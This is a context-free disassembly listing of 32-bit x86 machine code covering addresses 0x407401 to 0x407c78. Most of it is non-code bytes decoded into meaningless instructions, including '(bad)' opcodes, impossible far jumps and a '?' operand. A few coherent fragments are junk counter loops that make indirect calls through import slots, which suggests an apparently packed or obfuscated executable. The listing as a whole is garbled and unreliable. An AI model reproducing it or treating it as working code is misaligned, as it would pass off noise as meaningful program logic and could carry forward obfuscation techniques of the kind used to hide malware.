  407401:	mov    ebx,0xe1b08564
  407406:	add    ah,BYTE PTR [edi-0x611f4c93]
  40740c:	push   ds
  40740d:	das    
  40740e:	cmp    DWORD PTR [edx*4+0x86e0d67],eax
  407415:	call   0x896e0f61
  40741a:	test   DWORD PTR [ebx-0x3b8b7fcd],esp
  407420:	adc    ecx,DWORD PTR [ebx]
  407422:	mov    dl,0x19
  407424:	fild   DWORD PTR [edi]
  407426:	mov    edi,0x62495367
  40742b:	xchg   ebx,eax
  40742c:	pushf  
  40742d:	adc    eax,DWORD PTR ds:0x8d0a
  407432:	stc    
  407433:	sbb    al,0xb5
  407435:	cli    
  407436:	cld    
  407437:	out    0x70,eax
  407439:	lahf   
  40743a:	mov    bl,0x98
  40743c:	jnp    0x407404
  40743e:	jae    0x4073cd
  407440:	test   DWORD PTR [ecx+0x73],0xd0337470
  407447:	mov    edi,DWORD PTR [ebp-0x10]
  40744a:	or     DWORD PTR ds:0x4304d7,0x71a5
  407454:	add    edx,ecx
  407456:	mov    DWORD PTR ds:0x430449,0x5a49
  407460:	cmp    edi,edx
  407462:	mov    DWORD PTR ds:0x4304cf,0x6748
  40746c:	jmp    0x40761d
  407471:	not    DWORD PTR [ebp+edx*8-0xca68ae7]
  407478:	push   eax
  407479:	jb     0x4074d4
  40747b:	out    dx,eax
  40747c:	or     BYTE PTR [ecx],bl
  40747e:	jmp    0x7e7e:0xc535577c
  407485:	mov    bh,BYTE PTR [edi+0x7e]
  407488:	jle    0x40742f
  40748a:	mov    bh,0x63
  40748c:	ds mov cl,0x36
  40748f:	repnz push edi
  407491:	mul    ebp
  407493:	(bad)  
  407494:	mul    BYTE PTR [esi-0x18]
  407497:	and    al,0xa0
  407499:	cli    
  40749a:	sub    bh,dh
  40749c:	mov    ebx,0x13202186
  4074a1:	jne    0x407427
  4074a3:	div    BYTE PTR [edx]
  4074a5:	dec    ebx
  4074a6:	retf   
  4074a7:	xchg   ebx,eax
  4074a8:	nop
  4074a9:	fsubr  QWORD PTR [ecx-0x34938efe]
  4074af:	adc    BYTE PTR [ebx],cl
  4074b1:	or     BYTE PTR [esi-0x55ca10db],bl
  4074b7:	sbb    dh,ch
  4074b9:	pop    esp
  4074ba:	lock stos BYTE PTR es:[edi],al
  4074bc:	jne    0x40748d
  4074be:	xchg   ecx,eax
  4074bf:	test   BYTE PTR [ebx],al
  4074c1:	inc    esi
  4074c2:	pop    ebx
  4074c3:	push   es
  4074c4:	adc    bh,BYTE PTR [esi]
  4074c6:	inc    edi
  4074c7:	jl     0x407464
  4074c9:	int    0x2b
  4074cb:	js     0x407487
  4074cd:	dec    esp
  4074ce:	fidivr WORD PTR [eax]
  4074d0:	cmp    eax,0xb30655f0
  4074d5:	jmp    0x128f:0xa917ceca
  4074dc:	ret    0x6cc4
  4074df:	call   0x83adbdc4
  4074e4:	aam    0x29
  4074e6:	mov    eax,ds:0x60a34dcd
  4074eb:	std    
  4074ec:	imul   ebp,DWORD PTR [edx],0x927689a3
  4074f2:	jno    0x4074b4
  4074f4:	cwde   
  4074f5:	mov    dl,0xf1
  4074f7:	pop    DWORD PTR [eax+0x70b8549e]
  4074fd:	aad    0x66
  4074ff:	icebp  
  407500:	fldenv [edx-0x2c]
  407503:	mov    ds:0xae266150,al
  407508:	fadd   QWORD PTR [edi+0x5]
  40750b:	inc    ah
  40750d:	mov    cl,0xb
  40750f:	nop
  407510:	(bad)  
  407511:	push   edx
  407512:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407513:	mov    ah,0x35
  407515:	inc    ebx
  407516:	add    DWORD PTR [eax+0x67541375],esp
  40751c:	sti    
  40751d:	dec    esi
  40751e:	fld    QWORD PTR [eax-0x50]
  407521:	imul   ebp,esp,0x10
  407524:	sub    BYTE PTR [edi+0xd],dh
  407527:	xchg   ebx,eax
  407528:	test   al,0xc6
  40752a:	(bad)  [eax]
  40752c:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40752e:	xchg   esi,eax
  40752f:	test   BYTE PTR [ebp+0x3b7e2ad4],0xab
  407536:	xor    al,0xff
  407538:	sub    bh,BYTE PTR [esi-0x3358f9a3]
  40753e:	and    al,0x49
  407540:	mov    ebp,0x71f8d870
  407545:	jg     0x40758e
  407547:	hlt    
  407548:	push   ss
  407549:	dec    edi
  40754a:	push   edx
  40754b:	les    edx,FWORD PTR [ecx+edx*4-0x2f]
  40754f:	out    dx,eax
  407550:	sbb    DWORD PTR [edx],esp
  407552:	dec    eax
  407553:	dec    ecx
  407554:	inc    esi
  407555:	sbb    BYTE PTR [ecx-0x24],bl
  407558:	push   0xa773aafd
  40755d:	pusha  
  40755e:	sti    
  40755f:	popf   
  407560:	loop   0x407533
  407562:	nop
  407563:	clc    
  407564:	js     0x4075db
  407566:	mov    edx,0xd90b1d93
  40756b:	das    
  40756c:	xor    dl,BYTE PTR [ebx+edx*1+0x67]
  407570:	retf   0x8cfa
  407573:	jne    0x40752f
  407575:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407576:	repnz (bad) 
  407578:	mov    edx,0xe6f780ce
  40757d:	sti    
  40757e:	loop   0x4075b0
  407580:	rcl    BYTE PTR [esi],cl
  407582:	mov    ch,0x65
  407584:	dec    esi
  407585:	push   ss
  407586:	inc    ebp
  407587:	xchg   esp,ecx
  407589:	jp     0x4075c2
  40758b:	add    ebx,DWORD PTR cs:[ecx]
  40758e:	in     al,0x9b
  407590:	mov    ds:0xf5a08efc,al
  407595:	(bad)  
  407596:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407597:	jae    0x4075f1
  407599:	xchg   esp,eax
  40759a:	mov    dh,0xbd
  40759c:	ret    
  40759d:	lock and cl,0x89
  4075a1:	sub    bl,BYTE PTR [edi-0x6a8755fe]
  4075a7:	add    ah,ch
  4075a9:	xchg   edx,eax
  4075aa:	loopne 0x4075be
  4075ac:	fwait
  4075ad:	pop    ecx
  4075ae:	fwait
  4075af:	clc    
  4075b0:	push   cs
  4075b1:	mov    ebp,ds
  4075b3:	lods   al,BYTE PTR ds:[esi]
  4075b4:	mov    eax,0x45ecbeb5
  4075b9:	shr    DWORD PTR [ecx-0x3d39fd86],cl
  4075bf:	push   edx
  4075c0:	mov    dl,0x84
  4075c2:	clc    
  4075c3:	hlt    
  4075c4:	xchg   esi,eax
  4075c5:	inc    edi
  4075c6:	cdq    
  4075c7:	mov    edx,0xd65cd8be
  4075cc:	arpl   WORD PTR [edi+0x21],bx
  4075cf:	sbb    DWORD PTR [ecx+0x11],edi
  4075d2:	mov    ds,WORD PTR [edx+0x66]
  4075d5:	push   cs
  4075d6:	fisttp QWORD PTR [ebx+0x7b]
  4075d9:	adc    eax,0x7f59b9e7
  4075de:	mov    ecx,0x8f24f700
  4075e3:	(bad)  [edi-0x72f4a674]
  4075e9:	in     eax,0x1d
  4075eb:	pusha  
  4075ec:	pop    eax
  4075ee:	mov    ds:0x9f98bfe8,al
  4075f3:	add    BYTE PTR [edx+0xb],0xbc
  4075f7:	jge    0x4075a2
  4075f9:	mov    DWORD PTR [eax+eax*8-0x77d07b03],ecx
  407600:	aad    0x79
  407602:	out    0x81,al
  407604:	pop    ds
  407605:	sbb    al,0x20
  407607:	aaa    
  407608:	mov    ecx,0x3e50dbbb
  40760d:	inc    esi
  40760e:	cmp    edx,DWORD PTR [edx]
  407610:	or     BYTE PTR [ecx],ah
  407612:	(bad)  
  407613:	je     0x407603
  407615:	add    edi,esp
  407617:	pop    ebx
  407618:	jmp    0x38003ff3
  40761d:	je     0x40910e
  407623:	push   ebx
  407624:	jmp    0x408d87
  407629:	and    DWORD PTR ds:0x42edcb,0x0
  407633:	jmp    0x407647
  407638:	xor    edx,edx
  40763a:	xor    edx,DWORD PTR ds:0x42edcb
  407640:	inc    edx
  407641:	mov    DWORD PTR ds:0x42edcb,edx
  407647:	cmp    DWORD PTR ds:0x42edcb,0x1b
  40764e:	jae    0x40768b
  407654:	cmp    DWORD PTR ds:0x42edcb,0xa
  40765b:	jne    0x40766a
  407661:	push   DWORD PTR [ebp-0x10]
  407664:	call   DWORD PTR ds:0x42eab3
  40766a:	cmp    DWORD PTR ds:0x42edcb,0x9
  407671:	jne    0x407686
  407677:	xor    edx,edx
  407679:	xor    edx,DWORD PTR ds:0x42edcb
  40767f:	inc    edx
  407680:	mov    DWORD PTR ds:0x42edcb,edx
  407686:	jmp    0x407638
  40768b:	mov    edx,DWORD PTR [ebp-0x8]
  40768e:	mov    edi,DWORD PTR [ebp-0x10]
  407691:	sub    edi,edx
  407693:	jmp    0x407844
  407698:	or     DWORD PTR [ecx+0x67a86788],ebp
  40769e:	icebp  
  40769f:	jno    0x407690
  4076a1:	out    dx,al
  4076a2:	jns    0x4076bb
  4076a4:	pop    es
  4076a5:	popf   
  4076a6:	mov    eax,ds:0x7ec2416c
  4076ab:	jle    0x407637
  4076ad:	jg     0x40772d
  4076af:	jle    0x4076e9
  4076b1:	aam    0xbd
  4076b3:	and    al,0x1f
  4076b5:	lahf   
  4076b6:	and    BYTE PTR [edi+ecx*1],ah
  4076b9:	xchg   BYTE PTR [edi],ch
  4076bb:	inc    edi
  4076bc:	dec    esi
  4076bd:	mov    ds:0x9d7960e1,eax
  4076c2:	rcl    DWORD PTR [esp+eax*2],cl
  4076c5:	lea    eax,[eax+0x7d97e298]
  4076cb:	dec    edx
  4076cc:	out    dx,al
  4076cd:	aad    0xe4
  4076cf:	out    dx,eax
  4076d0:	aad    0x1
  4076d2:	jmp    0x407724
  4076d4:	loop   0x4076ef
  4076d6:	cdq    
  4076d7:	dec    ecx
  4076d8:	cli    
  4076d9:	mov    dh,0x15
  4076db:	inc    esp
  4076dc:	jle    0x4076eb
  4076de:	mov    ds:0x5eb1205,eax
  4076e3:	enter  0xf378,0x84
  4076e7:	mov    esp,0x2c3db3a8
  4076ec:	mov    dh,0x23
  4076ee:	xchg   DWORD PTR [esi],ebx
  4076f0:	or     ecx,DWORD PTR [eax-0xd]
  4076f3:	sub    ebx,DWORD PTR [ecx-0x1e47fcf3]
  4076f9:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4076fb:	ret    
  4076fc:	std    
  4076fd:	test   al,0xa4
  4076ff:	sub    esp,DWORD PTR [eax-0x596674ff]
  407705:	mov    bl,0xb
  407707:	cli    
  407708:	and    esi,esp
  40770a:	sti    
  40770b:	mov    bh,0xfe
  40770d:	cmp    DWORD PTR ds:0x9c099de1,0xa
  407714:	cmp    BYTE PTR [ebx+0x1b],ah
  407717:	mov    al,0x4c
  407719:	(bad)
  40771d:	(bad)  [edi-0x388de00a]
  407723:	rol    dh,0x7c
  407726:	ret    
  407727:	inc    edi
  407728:	cmp    eax,0xb700dcb6
  40772d:	out    0x6f,al
  40772f:	hlt    
  407730:	mov    ebx,0x4774e178
  407735:	jns    0x407736
  407737:	xor    dh,BYTE PTR [edx]
  407739:	sbb    BYTE PTR [ebp-0x1afe9289],al
  40773f:	mov    esp,DWORD PTR [esi+edx*4]
  407742:	or     esi,DWORD PTR [eax-0x5c]
  407745:	fcom   DWORD PTR [ebx-0x52590d07]
  40774b:	adc    DWORD PTR [esi],ecx
  40774d:	shr    BYTE PTR [esi+0x10],1
  407750:	and    DWORD PTR [eax+0x42],ebp
  407753:	sti    
  407754:	sbb    ah,bh
  407756:	xor    DWORD PTR [eax+0x76fb0e64],0xe22a99c6
  407760:	mov    ebx,0xb293939d
  407765:	dec    esp
  407766:	dec    ecx
  407767:	div    DWORD PTR [eax]
  407769:	pop    ecx
  40776a:	jg     0x407717
  40776c:	xor    ah,BYTE PTR [edx]
  40776e:	inc    edi
  40776f:	sub    ecx,DWORD PTR [edx+0x13]
  407772:	test   eax,0xdab2be0f
  407777:	jle    0x407788
  407779:	push   esp
  40777a:	fimul  DWORD PTR [edi+0x57]
  40777d:	enter  0x8a38,0x4d
  407781:	sbb    eax,0x8c553bd9
  407786:	mov    eax,0xf3904030
  40778b:	inc    eax
  40778c:	jb     0x4077d1
  40778e:	mov    eax,ds:0xef8d122e
  407793:	mov    esi,0xc53feebb
  407798:	cmp    al,bh
  40779a:	shr    BYTE PTR [edx+0x74],0xa9
  40779e:	jns    0x40774e
  4077a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4077a1:	aad    0xbc
  4077a3:	adc    ecx,DWORD PTR [ebp+eax*2+0x613727f9]
  4077aa:	cwde   
  4077ab:	lods   al,BYTE PTR ds:[esi]
  4077ac:	push   edi
  4077ad:	mov    eax,0xa34a7513
  4077b2:	push   eax
  4077b3:	retf   
  4077b4:	int3   
  4077b5:	mov    ah,0x36
  4077b7:	lods   al,BYTE PTR ds:[esi]
  4077b8:	inc    eax
  4077b9:	js     0x407788
  4077bb:	xor    al,0x46
  4077bd:	pop    edx
  4077be:	test   al,0x95
  4077c0:	lds    esi,FWORD PTR [edi+0x3b]
  4077c3:	sar    ecx,1
  4077c5:	xchg   BYTE PTR [ecx],dl
  4077c7:	sbb    eax,0x209e661e
  4077cc:	mov    eax,0x58c30272
  4077d1:	pop    es
  4077d2:	dec    BYTE PTR [ebp-0x69]
  4077d5:	add    edx,DWORD PTR ds:0x209be2e9
  4077db:	test   BYTE PTR [ebx+0x31f417b7],0xa0
  4077e2:	sbb    eax,0xeb7e78c
  4077e7:	enter  0x3ba5,0xdd
  4077eb:	imul   esi,DWORD PTR [ebx-0x7c],0xb686d511
  4077f2:	aad    0xd4
  4077f4:	jno    0x407839
  4077f6:	mov    dh,0x73
  4077f8:	add    DWORD PTR [edi],ebx
  4077fa:	stos   DWORD PTR es:[edi],eax
  4077fb:	mov    bh,0x2a
  4077fd:	xchg   ecx,eax
  4077fe:	imul   ecx,DWORD PTR ds:0xc6c1c3b3,0x504a6b31
  407808:	out    dx,al
  407809:	inc    esi
  40780a:	sbb    BYTE PTR [esi-0x51],al
  40780d:	and    eax,0x7e8ec048
  407812:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407813:	inc    edi
  407814:	repnz xor al,0xd5
  407817:	test   BYTE PTR [eax-0xf2e8560],0xdb
  40781e:	dec    ebx
  40781f:	push   ebx
  407820:	mov    BYTE PTR [ebx+edx*8],al
  407823:	dec    esi
  407824:	cwde   
  407825:	aaa    
  407826:	xor    eax,0x5862d5e9
  40782b:	ret    
  40782c:	or     edi,DWORD PTR [esi-0x48]
  40782f:	lea    edx,[ebx]
  407831:	ret    
  407832:	mov    ah,0x21
  407834:	(bad)  
  407835:	gs scas al,BYTE PTR es:[edi]
  407837:	clc    
  407838:	sub    bl,0x9f
  40783b:	ja     0x40782f
  40783d:	hlt    
  40783e:	mov    ds:0x9e511ce,al
  407843:	push   0xffffff8b
  407845:	push   ebp
  407846:	cld    
  407847:	adc    DWORD PTR ds:0x430449,0x4304cf
  407851:	xor    edx,eax
  407853:	add    edx,ecx
  407855:	cmp    edi,edx
  407857:	mov    DWORD PTR ds:0x43046d,0x688e
  407861:	jb     0x40910d
  407867:	mov    DWORD PTR ds:0x42e7c4,0x1e
  407871:	cmp    DWORD PTR ds:0x42e7c4,0x0
  407878:	je     0x4078a9
  40787e:	cmp    DWORD PTR ds:0x42e7c4,0x25
  407885:	jne    0x407896
  40788b:	push   0x2141
  407890:	call   DWORD PTR ds:0x42eab7
  407896:	mov    edi,DWORD PTR ds:0x42e7c4
  40789c:	dec    edi
  40789d:	mov    DWORD PTR ds:0x42e7c4,edi
  4078a3:	jmp    0x407871
  4078a8:	inc    edx
  4078a9:	mov    edx,DWORD PTR [ebp-0x28]
  4078ac:	mov    edi,DWORD PTR [ebp-0x4]
  4078af:	xor    edx,eax
  4078b1:	xor    edi,eax
  4078b3:	sub    ebx,DWORD PTR ds:0x42edcf
  4078b9:	add    edi,ecx
  4078bb:	add    edx,ecx
  4078bd:	and    DWORD PTR ds:0x43043d,0x0
  4078c7:	xor    ebx,ebx
  4078c9:	or     ebx,DWORD PTR ds:0x43043d
  4078cf:	inc    ebx
  4078d0:	mov    DWORD PTR ds:0x43043d,ebx
  4078d6:	cmp    DWORD PTR ds:0x43043d,0x15
  4078dd:	jne    0x4078f1
  4078e3:	push   0x1
  4078e5:	push   DWORD PTR [ebp-0x20]
  4078e8:	push   DWORD PTR [ebp-0x10]
  4078eb:	call   DWORD PTR ds:0x42ec27
  4078f1:	cmp    DWORD PTR ds:0x43043d,0x11
  4078f8:	jb     0x4078c7
  4078fe:	imul   edx,edi
  407901:	mov    edi,DWORD PTR [ebp-0x8]
  407904:	mov    ebx,DWORD PTR [ebp-0x10]
  407907:	sub    ebx,edi
  407909:	cmp    ebx,edx
  40790b:	ja     0x40791d
  407911:	mov    edx,DWORD PTR [ebp-0x4]
  407914:	xor    edx,eax
  407916:	add    edx,ecx
  407918:	jmp    0x40877e
  40791d:	mov    edx,DWORD PTR [ebp-0x2c]
  407920:	mov    edi,DWORD PTR [ebp-0x4]
  407923:	xor    edx,eax
  407925:	xor    edi,eax
  407927:	add    edi,ecx
  407929:	add    edx,ecx
  40792b:	imul   edx,edi
  40792e:	mov    edi,DWORD PTR [ebp-0x8]
  407931:	jmp    0x407ae2
  407936:	ret    0x1100
  407939:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40793a:	shl    DWORD PTR [ebp+0x7ad26172],1
  407940:	dec    edi
  407941:	inc    DWORD PTR [edi+eiz*2-0x3f22b623]
  407948:	jle    0x4079c8
  40794a:	mov    bh,BYTE PTR [edi+0x7e]
  40794d:	jle    0x4079b2
  40794f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407950:	jno    0x40796b
  407952:	xor    al,0x62
  407954:	mov    bh,BYTE PTR [ebx+0x78]
  407957:	mov    edx,0xa0eb7c94
  40795c:	ret    
  40795d:	out    dx,al
  40795e:	sub    eax,0x6d6011ca
  407963:	loopne 0x40795a
  407965:	stos   BYTE PTR es:[edi],al
  407966:	mov    ds:0x5cb254b1,eax
  40796b:	aas    
  40796c:	push   0x5d
  40796e:	ins    DWORD PTR es:[edi],dx
  40796f:	sbb    eax,0x36077744
  407974:	rol    esi,1
  407976:	loopne 0x40792f
  407978:	imul   ah
  40797a:	les    ebp,FWORD PTR [edi-0x2510d848]
  407980:	xchg   ecx,eax
  407981:	inc    ebp
  407982:	sbb    ah,BYTE PTR [esi]
  407984:	ror    DWORD PTR [ebx-0x48d06ca0],0x9f
  40798b:	(bad)  
  40798c:	fadd   QWORD PTR [eax]
  40798e:	and    al,0x6d
  407990:	sbb    esi,DWORD PTR [eax-0x4c]
  407993:	dec    esp
  407994:	pop    ebp
  407995:	jne    0x4079f6
  407997:	dec    eax
  407998:	cmp    bh,ah
  40799a:	sub    ah,0xda
  40799d:	jo     0x40798c
  40799f:	call   0x33e8:0xd882a473
  4079a6:	call   0xf40b5f52
  4079ab:	add    eax,0xaa3376e1
  4079b0:	or     DWORD PTR [ebx],0x6cbcf5ba
  4079b6:	mov    DWORD PTR [ebx],ecx
  4079b8:	jl     0x407a11
  4079ba:	scas   eax,DWORD PTR es:[edi]
  4079bb:	mov    ch,BYTE PTR [edx-0x57]
  4079be:	loop   0x40794e
  4079c0:	inc    ecx
  4079c1:	rcr    bl,cl
  4079c3:	mov    dh,0xf4
  4079c5:	add    dh,bh
  4079c7:	xor    esp,ebx
  4079c9:	or     ebx,DWORD PTR [eax+0x41]
  4079cc:	fmul   DWORD PTR [esi+0x2c75c66]
  4079d2:	add    cl,BYTE PTR [edx-0x41c5450d]
  4079d8:	sub    ebp,DWORD PTR [eax+0x35]
  4079db:	call   0x856c:0x3ca2c3b
  4079e2:	xchg   esi,eax
  4079e3:	repnz leave 
  4079e5:	lods   al,BYTE PTR ds:[esi]
  4079e6:	fiadd  DWORD PTR [esi+0x44f656b]
  4079ec:	call   0x7a3a3ad9
  4079f1:	mov    ah,0x72
  4079f3:	(bad)  
  4079f5:	cs inc ecx
  4079f7:	scas   al,BYTE PTR es:[edi]
  4079f8:	inc    eax
  4079f9:	jle    0x407a58
  4079fb:	mov    dl,BYTE PTR [edi-0x75b8c50b]
  407a01:	cdq    
  407a02:	xor    dl,BYTE PTR [esi-0x60fd338e]
  407a08:	hlt    
  407a09:	lods   al,BYTE PTR ds:[esi]
  407a0a:	retf   
  407a0b:	jg     0x407a77
  407a0d:	dec    ebx
  407a0e:	addr16 xchg esp,eax
  407a10:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407a11:	or     ch,BYTE PTR [edi-0x5]
  407a14:	call   0x4a3c2c7a
  407a19:	or     DWORD PTR [edx],0xffffffba
  407a1c:	pop    edx
  407a1d:	mov    eax,0x7e25105
  407a22:	cwde   
  407a23:	(bad)  [esi]
  407a25:	mov    al,ds:0x9ba50a1a
  407a2a:	out    0xc8,al
  407a2c:	push   0x24
  407a2e:	shl    BYTE PTR [edi+0x57b6673],cl
  407a34:	loop   0x407a98
  407a36:	pop    ds
  407a37:	jae    0xf7f22695
  407a3d:	ins    DWORD PTR es:[edi],dx
  407a3e:	xor    DWORD PTR [esi],esi
  407a40:	adc    DWORD PTR [edx-0x12],ecx
  407a43:	mov    esi,0xf0af88ab
  407a48:	xor    DWORD PTR [ebx],esi
  407a4a:	xchg   DWORD PTR [esi-0x31ec95a2],eax
  407a50:	or     eax,0xff64fc38
  407a55:	fdivr  QWORD PTR [esi+0xe310315]
  407a5b:	cmp    esi,esi
  407a5d:	xchg   esp,eax
  407a5e:	shr    ecx,1
  407a60:	fld    st(5)
  407a62:	push   cs
  407a63:	ins    DWORD PTR es:[edi],dx
  407a64:	repnz mov esp,0xf700cca3
  407a6a:	sahf   
  407a6b:	lds    ebx,FWORD PTR [esi+0x62]
  407a6e:	xchg   DWORD PTR [edx+0xb75f296],ecx
  407a74:	xor    DWORD PTR [edi],esi
  407a76:	mov    edx,0x91c75046
  407a7b:	bound  ebx,QWORD PTR [ebx-0x5b]
  407a7e:	repz cmp bl,ah
  407a81:	lds    esi,FWORD PTR [eax]
  407a83:	popa   
  407a84:	inc    ecx
  407a85:	mov    BYTE PTR fs:[ebp+0x17],al
  407a89:	mov    DWORD PTR [eax],ebx
  407a8b:	jg     0x407a97
  407a8d:	fimul  DWORD PTR [edx-0x13ae7246]
  407a93:	mov    ecx,0x3e780deb
  407a98:	aaa    
  407a99:	adc    BYTE PTR ds:0x95db6cc0,0x8a
  407aa0:	inc    edi
  407aa1:	add    eax,0xf14abcf2
  407aa6:	xchg   esi,eax
  407aa7:	sub    ecx,DWORD PTR [ecx-0x49]
  407aaa:	scas   eax,DWORD PTR es:[edi]
  407aab:	sbb    cl,BYTE PTR [ebx]
  407aad:	push   esp
  407aae:	jp     0x407a3b
  407ab0:	inc    eax
  407ab1:	aam    0x0
  407ab3:	jg     0x407a74
  407ab5:	sbb    al,0x21
  407ab7:	jl     0x407ad4
  407ab9:	mov    bl,0x31
  407abb:	sbb    al,dl
  407abd:	xor    al,0x4b
  407abf:	aaa    
  407ac0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407ac1:	sahf   
  407ac2:	ror    BYTE PTR [ebx+ebx*2+0x7e96abca],cl
  407ac9:	outs   dx,DWORD PTR ds:[esi]
  407aca:	mov    esp,0x4e926b47
  407acf:	mov    ch,0x9d
  407ad1:	pop    ebx
  407ad2:	push   ss
  407ad3:	lds    ebp,FWORD PTR [esi+ecx*4-0x16]
  407ad7:	jae    0x407b0f
  407ad9:	xchg   edi,eax
  407ada:	add    ah,bh
  407adc:	push   ecx
  407add:	test   bh,bl
  407adf:	ins    DWORD PTR es:[edi],dx
  407ae0:	xchg   esp,eax
  407ae1:	aaa    
  407ae2:	mov    ebx,DWORD PTR [ebp-0x10]
  407ae5:	sub    ebx,edi
  407ae7:	cmp    ebx,edx
  407ae9:	ja     0x407af7
  407aef:	mov    edx,DWORD PTR [ebp-0x28]
  407af2:	jmp    0x408770
  407af7:	mov    edx,DWORD PTR [ebp-0x30]
  407afa:	mov    edi,DWORD PTR [ebp-0x4]
  407afd:	jmp    0x407cae
  407b02:	mov    WORD PTR [edx+0x6130bf0c],?
  407b08:	dec    ebp
  407b09:	jno    0x407ae6
  407b0b:	les    ecx,FWORD PTR [esi-0x3db90336]
  407b11:	push   ecx
  407b12:	imul   eax,ecx,0x7f8a7e7e
  407b18:	jle    0x407b98
  407b1a:	push   0x5d
  407b1c:	loopne 0x407abd
  407b1e:	inc    edx
  407b1f:	sub    eax,0x476b5df3
  407b24:	test   dl,0x2
  407b27:	sub    dh,BYTE PTR [edi+0x4385b424]
  407b2d:	repz add eax,0x1bc888a1
  407b33:	add    eax,0x33f1f2e4
  407b38:	add    ch,dl
  407b3a:	xor    al,0x1c
  407b3c:	mov    ds:0x8d1053ee,eax
  407b41:	mov    al,0x5f
  407b43:	(bad)  
  407b44:	cmp    al,0xb1
  407b46:	jle    0x407b2e
  407b48:	fild   WORD PTR [esi-0xe]
  407b4b:	jmp    0x407b4a
  407b4d:	pop    ebp
  407b4e:	inc    ecx
  407b4f:	retf   
  407b50:	fisub  DWORD PTR [eax-0x17]
  407b53:	cmc    
  407b54:	lea    esi,ds:0xbc0c442
  407b5a:	add    BYTE PTR [esi-0x43],cl
  407b5d:	ret    0xc
  407b60:	(bad)  
  407b61:	pop    ebp
  407b62:	dec    ebx
  407b63:	stc    
  407b64:	xchg   ecx,eax
  407b65:	into   
  407b66:	popa   
  407b67:	add    esi,DWORD PTR [ebx+0x20351460]
  407b6d:	inc    ebp
  407b6e:	jmp    0xdb1c9c14
  407b73:	sbb    esi,DWORD PTR [edi+0x1b27d347]
  407b79:	xchg   BYTE PTR [edi-0x55],dl
  407b7c:	sahf   
  407b7d:	cld    
  407b7e:	jno    0x407b40
  407b80:	imul   ebx,DWORD PTR [ebx],0xffffff81
  407b83:	push   esp
  407b84:	mov    bh,0x8b
  407b86:	adc    cl,cl
  407b88:	push   esp
  407b89:	mov    dh,0xa9
  407b8b:	aam    0x3
  407b8d:	and    DWORD PTR [edx+0x32614972],ecx
  407b93:	outs   dx,DWORD PTR ds:[esi]
  407b94:	xchg   ecx,eax
  407b95:	scas   al,BYTE PTR es:[edi]
  407b96:	enter  0xeb1d,0xe2
  407b9a:	jg     0x407b6c
  407b9c:	xor    dl,BYTE PTR [esi]
  407b9e:	enter  0x4afb,0x1a
  407ba2:	psrld  mm4,QWORD PTR [edi+0x45]
  407ba6:	mov    ebp,0x60b1f9e0
  407bab:	pop    ecx
  407bac:	ins    BYTE PTR es:[edi],dx
  407bad:	pop    esp
  407bae:	mov    dh,0x32
  407bb0:	int3   
  407bb1:	aam    0x8c
  407bb3:	dec    edx
  407bb4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407bb5:	and    al,ch
  407bb7:	jmp    FWORD PTR [eax]
  407bb9:	(bad)  
  407bbb:	daa    
  407bbc:	sbb    BYTE PTR [ebx],bl
  407bbe:	xchg   ebp,eax
  407bbf:	push   edi
  407bc0:	es push ebx
  407bc2:	lock xchg ebp,eax
  407bc4:	pop    es
  407bc5:	and    DWORD PTR [edx+edi*1-0x2bcef3bf],edx
  407bcc:	pop    ebp
  407bcd:	call   0x8059:0x797fa4d
  407bd4:	xchg   DWORD PTR [edi-0x37fa04],edi
  407bda:	mov    BYTE PTR [esi+0x5],cl
  407bdd:	int    0x70
  407bdf:	stc    
  407be0:	scas   eax,DWORD PTR es:[edi]
  407be1:	push   esp
  407be2:	retf   0xa8da
  407be5:	into   
  407be6:	jnp    0x407bb7
  407be8:	inc    esp
  407be9:	call   0xf6fa:0x74ac7d6c
  407bf0:	jl     0x407ba9
  407bf2:	scas   al,BYTE PTR es:[edi]
  407bf3:	lods   eax,DWORD PTR ds:[esi]
  407bf4:	push   ss
  407bf5:	xlat   BYTE PTR ds:[ebx]
  407bf6:	sbb    esp,DWORD PTR [esi]
  407bf8:	clc    
  407bf9:	sbb    bh,BYTE PTR [esi]
  407bfb:	dec    edi
  407bfc:	jae    0x407c70
  407bfe:	mov    edi,DWORD PTR [ebp+0x18e035e4]
  407c04:	(bad)  
  407c05:	ss in  eax,dx
  407c07:	cld    
  407c08:	adc    al,0xd0
  407c0a:	and    eax,0x4eb71684
  407c0f:	dec    ebx
  407c10:	cwde   
  407c11:	(bad)  
  407c13:	popa   
  407c14:	je     0x407c0d
  407c16:	ins    BYTE PTR es:[edi],dx
  407c17:	mov    esp,0xd24c26dc
  407c1c:	mul    DWORD PTR [ebx]
  407c1e:	jle    0x407bc0
  407c20:	or     edx,DWORD PTR [ecx]
  407c22:	lea    ebx,[esi+0x6a176c7b]
  407c28:	fadd   QWORD PTR [ebp+0x47c01e1d]
  407c2e:	push   0x1e
  407c30:	mov    DWORD PTR [ecx],ebp
  407c32:	fwait
  407c33:	and    BYTE PTR [edi+0x77],bh
  407c36:	mov    al,BYTE PTR [eax-0x2e]
  407c39:	adc    BYTE PTR [ebp-0x58eb3940],dh
  407c3f:	test   BYTE PTR [edi+0x1d],0x69
  407c43:	(bad)  [ecx+eiz*1]
  407c46:	cs in  al,0xb0
  407c49:	xor    edi,DWORD PTR [esi-0x14f87493]
  407c4f:	xchg   ebp,eax
  407c50:	jl     0x407cb8
  407c52:	jmp    0x407cc9
  407c54:	popa   
  407c55:	sbb    edx,DWORD PTR [eax+0x42]
  407c58:	aaa    
  407c59:	das    
  407c5a:	pop    esi
  407c5b:	mov    edx,0x32c4f222
  407c60:	sbb    eax,0xb2aec3d6
  407c65:	ja     0x407c2f
  407c67:	xor    eax,DWORD PTR [edi-0x4a]
  407c6a:	adc    eax,0xa11c71e5
  407c6f:	push   ecx
  407c70:	scas   al,BYTE PTR es:[edi]
  407c71:	in     eax,dx
  407c72:	test   DWORD PTR [ebx+0x6ef67c3f],ecx
  407c78:	int    0x75
